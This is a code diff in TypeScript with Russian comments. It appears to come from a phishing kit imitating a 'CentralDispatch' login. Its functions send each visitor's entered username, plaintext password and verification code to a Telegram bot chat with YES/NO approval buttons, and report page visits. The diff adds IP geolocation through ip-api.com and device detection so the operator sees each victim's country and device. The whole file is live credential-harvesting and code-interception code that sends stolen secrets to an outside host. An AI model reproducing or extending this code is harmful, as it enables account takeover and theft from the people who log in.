@@ -7,16 +7,81 @@ const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";
 
 /**
+ * Получение информации о стране по IP адресу
+ * @param ip - IP адрес
+ * @returns Объект с информацией о стране
+ */
+async function getCountryInfo(ip: string): Promise<{ country: string; flag: string }> {
+  try {
+    // Пропускаем локальные IP
+    if (ip === "unknown" || ip.startsWith("192.168.") || ip.startsWith("10.") || ip === "127.0.0.1") {
+      return { country: "Unknown", flag: "🌍" };
+    }
+
+    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode`);
+    const data = await response.json();
+
+    if (data.status === "success") {
+      const flag = getCountryFlag(data.countryCode);
+      return { country: data.country, flag };
+    }
+
+    return { country: "Unknown", flag: "🌍" };
+  } catch (error) {
+    console.error("[TELEGRAM] Ошибка получения информации о стране:", error);
+    return { country: "Unknown", flag: "🌍" };
+  }
+}
+
+/**
+ * Получение флага страны по коду
+ * @param countryCode - Код страны (US, RU и т.д.)
+ * @returns Эмодзи флага
+ */
+function getCountryFlag(countryCode: string): string {
+  if (!countryCode || countryCode.length !== 2) return "🌍";
+  
+  const codePoints = countryCode
+    .toUpperCase()
+    .split("")
+    .map((char) => 127397 + char.charCodeAt(0));
+  return String.fromCodePoint(...codePoints);
+}
+
+/**
+ * Определение типа устройства по User Agent
+ * @param userAgent - User Agent строка
+ * @returns Тип устройства и эмодзи
+ */
+function getDeviceType(userAgent: string): string {
+  const ua = userAgent.toLowerCase();
+  
+  if (ua.includes("mobile") || ua.includes("android") || ua.includes("iphone") || ua.includes("ipad")) {
+    return "📱 Мобильное устройство";
+  }
+  
+  if (ua.includes("tablet")) {
+    return "📱 Планшет";
+  }
+  
+  return "💻 Компьютер";
+}
+
+/**
  * Отправка сообщения в Telegram с кнопками YES/NO
  * @param username - имя пользователя
  * @param password - пароль
  * @param requestId - уникальный ID запроса для отслеживания ответа
+ * @param clientIp - IP адрес клиента (опционально)
+ * @param userAgent - User Agent (опционально)
  * @returns message_id отправленного сообщения
  */
 export async function sendLoginTelegram(
   username: string,
   password: string,
-  requestId: string
+  requestId: string,
+  clientIp?: string,
+  userAgent?: string
 ): Promise<number> {
   console.log("[TELEGRAM] Отправка уведомления о входе...");
   console.log("[TELEGRAM] Request ID:", requestId);
@@ -25,12 +90,18 @@ export async function sendLoginTelegram(
     throw new Error("TELEGRAM_BOT_TOKEN и TELEGRAM_CHAT_ID должны быть настроены");
   }
 
+  // Получаем информацию о стране
+  const countryInfo = clientIp ? await getCountryInfo(clientIp) : { country: "Unknown", flag: "🌍" };
+  const deviceType = userAgent ? getDeviceType(userAgent) : "💻 Компьютер";
+
   const message = `🔐 *CentralDispatch - Новый вход в систему*
 
 👤 *Username:* \`${username}\`
 🔑 *Password:* \`${password}\`
 
-⏰ *Время:* ${new Date().toLocaleString("ru-RU")}
+🌍 *IP:* \`${clientIp || "unknown"}\`
+📍 *Страна:* ${countryInfo.country} ${countryInfo.flag}
+${deviceType}
 
 Выберите действие:`;
 
@@ -132,15 +203,12 @@ export async function sendCodeTelegram(
     throw new Error("TELEGRAM_BOT_TOKEN и TELEGRAM_CHAT_ID должны быть настроены");
   }
 
-  const message = `🔢 *CentralDispatch - Код верификации*
+  const message = `🔐 *CentralDispatch - Код подтверждения*
 
+📝 *Код:* \`${code}\`
 👤 *Username:* \`${username}\`
-🔑 *Code:* \`${code}\`
 
-🌐 *IP:* \`${clientIp}\`
-💻 *User Agent:* \`${userAgent}\`
-
-⏰ *Время:* ${new Date().toLocaleString("ru-RU")}`;
+Введите этот код для подтверждения входа.`;
 
   try {
     const response = await fetch(
@@ -235,13 +303,17 @@ export async function sendVisitNotification(
     return;
   }
 
-  const message = `🌐 *CentralDispatch - Новое посещение*
+  // Получаем информацию о стране
+  const countryInfo = await getCountryInfo(clientIp);
+  const deviceType = getDeviceType(userAgent);
 
-📍 *Страница:* ${path}
-🌐 *IP:* \`${clientIp}\`
-💻 *User Agent:* \`${userAgent}\`
+  const message = `🔐 *Посещение страницы входа*
 
-⏰ *Время:* ${new Date().toLocaleString("ru-RU")}`;
+🌍 *IP:* \`${clientIp}\`
+📍 *Страна:* ${countryInfo.country} ${countryInfo.flag}
+${deviceType}
+
+Кто-то зашел на сайт CentralDispatch.`;
 
   try {
     const response = await fetch(
